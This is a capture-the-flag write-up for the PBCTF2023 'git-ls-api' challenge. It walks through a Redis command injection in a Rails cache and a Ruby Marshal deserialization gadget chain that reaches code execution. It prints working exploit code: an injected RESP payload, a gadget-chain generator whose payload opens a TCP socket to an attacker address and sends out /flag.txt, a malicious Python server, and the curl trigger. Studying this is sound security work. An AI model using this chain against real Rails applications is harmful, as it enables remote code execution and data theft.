---
layout: post
title:  "PBCTF2023 git-ls-api"
date:   2023-02-22 
author: numbers
tags: [web, ruby]
---

We are given the source to a simple service which displays the SHA hash and file list for a github project. We can also provide an `api_endpoint` and it will retrieve from our host instead.

the `index` endpoint invokes `octokit` to retrieve the SHA and tree of the target repo. While searching the net to understand how `Octokit` works, I found a [gitlab bug](https://gitlab.com/gitlab-org/gitlab/-/issues/371098) where the importer could be hijacked via improper passing of a `SawyerResource` object to a caching function. The bug in this challenge wound up being almost identical, but using the built in rails redis cacher rather than being in gitlab's methods. 

The redis command serializer assumes that it will receive a norrmal flat bytelike or string object, and uses `to_s` to get the value and `bytesize` to compute the length.  `SawyerResource` objects are automagic structs produced directly from our input JSON, so we can set those to mismatch when constructing the RESP command string (it doesn't check that it's the builtin `bytesize` method and not just a field on the input). This lets us inject redis commands directly by using something like:

```python
exploit = {"sha": {"to_s": { "to_s": { "to_s": { "b":{
           "to_s":f"AA\r\n$2\r\nPX\r\n$2\r\n10\r\n*5\r\n$3\r\nset\r\n${len(target)}\r\n{target}\r\n${len(payload)}\r\n{payload}\r\n$2\r\nPX\r\n$6\r\n300000\r\n",
            "bytesize":2
            }}}}},"tree": [{"path":"pwnedbyPFS"}]}```

Here, I'm invoking a `set` command. 

The redis connector is invoked with `raw: True` for both directly controlled fields, but there's a third value stored for every connection which doesn't have that

```ruby
 def session
    Rails.cache.fetch(session_id, expires_in: 5.minutes) do
      { created_at: DateTime.now }
    end.to_json
  end
```

Values fetched without `raw: True` will be unmarshalled, leading to a classic ruby unmarshalling exploit. We can use redis injection to set our `session_id` in the redis server to controlled data, then trigger it to be unmarshalled

I wasted a _ton_ of time once I got to this point, but I  didn't really know what I was doing. I'll try to explain ruby unmarshalling best I can, but there are [numerous](https://bishopfox.com/blog/ruby-vulnerabilities-exploits) [other](https://www.elttam.com/blog/ruby-deserialization/) [resources](https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) [worth](https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md) [reading](https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md).

Ruby unmarshalling exploits require a "gadget chain" (somewhat analogous to ROP chaining, i.e., reusing existing code). When unmarshalling an object, ruby will invoke the `marshal_load` and `_load`. There are nuanced differences between the two, for more info check [this link](https://blog.appsignal.com/2019/03/26/object-marshalling-in-ruby.html). A typical ruby gadget chain will start with an object which has a `marshal_load` implementation, although from my research, increasingly many exploit chains utilize more complex gadgets or indirect effects rather than directly using `marshal_load`. Whatever the initial mechanism, the general technique is to utilize ruby class which, when unmarshalled, allows you to invoke other useful functions (e.g., by setting the value of a member variable which will be invoked). Ultimately, you want to invoke a sink function which gets arbitrary ruby execution, or other behavior (e.g. shell execution) as determined by the constraints of your expoit.


I was able to replicate a few different gadget options I found online to kick off the chain. The easiest wound up being the `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` gadget. This gadget lets us invoke any method (without arguments) on any class. I will briefly describe the `DeprecatedInstanceVariableProxy` gadget, but definately read the source and check out other writeups for more information.

The `DeprecatedInstanceVariableProxy` implements `method_missing` which will be invoked when any unfound method is called on the class:

```ruby
def method_missing(called, *args, &block)
    @deprecator.warn(@message, caller_locations)
    target.__send__(called, *args, &block)
end
```

`Target` is implemented as:
```ruby
class DeprecatedInstanceVariableProxy < DeprecationProxy
    def initialize(instance, method, var = "@#{method}", deprecator = ActiveSupport::Deprecation.instance)
        @instance = instance
        @method = method
        @var = var
        @deprecator = deprecator
    end

    private
    def target
        @instance.__send__(@method)
    end

    def warn(callstack, called, args)
          @deprecator.warn("#{@var} is deprecated! Call #{@method}.#{called} instead of #{@var}.#{called}. Args: #{args.inspect}", callstack)
        end
    end
```

By setting `@method` and `@instance`, we can invoke any function on any class. We instantiate the deprecator as follows:

```ruby
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
depr.instance_variable_set(:@instance, CLASS)
depr.instance_variable_set(:@method, :METHOD)
depr.instance_variable_set(:@silenced, true)
depr.instance_variable_set(:@var, "@METHOD")
d2 = ActiveSupport::Deprecation.new
d2.instance_variable_set(:@silenced, true)
depr.instance_variable_set(:@deprecator, d2)
```
Replacing `CLASS` with an instance of our target class, and `METHOD` with our target method, we can invoke `CLASS.METHOD`. Note that the target method must have no arguments.

At this point, I had to go digging, as all of the sink function I've seen people mention have been patched (e.g., `ActiveModel::AttributeMethods::ClassMethods::CodeGenerator`).

I discovered `ActiveSupport::CodeGenerator::MethodSet`, which has a function `apply` which calls `module_eval` on an instance variable (very similar to how the DIVP gadget has been used before)

```ruby
def apply(owner, path, line)
  unless @sources.empty?
    @cache.module_eval("# frozen_string_literal: true\n" + @sources.join(";"), path, line)
  end
  @methods.each do |name, as|
    owner.define_method(name, @cache.instance_method(as))
  end
end
```

We can't invoke the `apply` method directly, but examining the surrounding code we can instantiate an `ActiveSupport::CodeGenerator` and it's child `MethodSet` and invoke `execute` on the `CodeGenerator`:

```ruby
def execute
  @namespaces.each_value do |method_set|
    method_set.apply(@owner, @path, @line - 1)
  end
end
```

Here's my code to generate the payload:

```ruby
class ActiveSupport
    class Deprecation
        class DeprecatedInstanceVariableProxy
            def initialize(instance, method)
                @instance = instance
                @method = method
            end
       end
    end
    class CodeGenerator
        class MethodSet
            METHOD_CACHES = Hash.new 
            def initialize(instance, method)
                @instance = instance
                @method = method
            end
        end
    end
end


methodset = ActiveSupport::CodeGenerator::MethodSet.allocate
methodset.instance_variable_set(:@sources, ["f=TCPSocket.open(\"IP_ADDRESS_HERE\",1234)", "t=File.read(\"/flag.txt\")", "f.puts(t)"]) #;
methodset.instance_variable_set(:@cache, Module.class)

codegen   = ActiveSupport::CodeGenerator.allocate
codegen.instance_variable_set(:@owner, "OWNER")
codegen.instance_variable_set(:@path, "PATH")
codegen.instance_variable_set(:@line, 1)
codegen.instance_variable_set(:@namespaces, {"1"=>methodset})

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
depr.instance_variable_set(:@instance, codegen)
depr.instance_variable_set(:@method, :execute)
depr.instance_variable_set(:@silenced, true)
depr.instance_variable_set(:@var, "@execute")
d2 = ActiveSupport::Deprecation.new
d2.instance_variable_set(:@silenced, true)
depr.instance_variable_set(:@deprecator, d2)

Marshal.dump(depr)
```

I host it with python and invoke the server twice with curl. The first invokation sets the session variable in the redis cache, and the second causes it to be unmarshalled.

```python
#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import json
payload = "put_payload_here"
target = "put_sessionID_here"
exploit = {"sha": {"to_s": { "to_s": { "to_s": { "b":{
           "to_s":f"AA\r\n$2\r\nPX\r\n$2\r\n10\r\n*5\r\n$3\r\nset\r\n${len(target)}\r\n{target}\r\n${len(payload)}\r\n{payload}\r\n$2\r\nPX\r\n$6\r\n300000\r\n",
            "bytesize":2
            }}}}},"tree": [{"path":"pwnedbyPFS"}]}
pwn = json.dumps(exploit).encode("utf-8")


class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        self.send_response(200)
        self.send_header('Content-type', 'application/vnd.github.v3+json')
        self.end_headers()
        
        self.wfile.write(pwn)
        
        return
    
if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 80), RequestHandler)
    server.serve_forever()
```

`curl -vv -c -b "./cookie" --path-as-is http://git-ls-api.chal.perfect.blue/a/B?api_endpoint=http://your_endpoint.net`
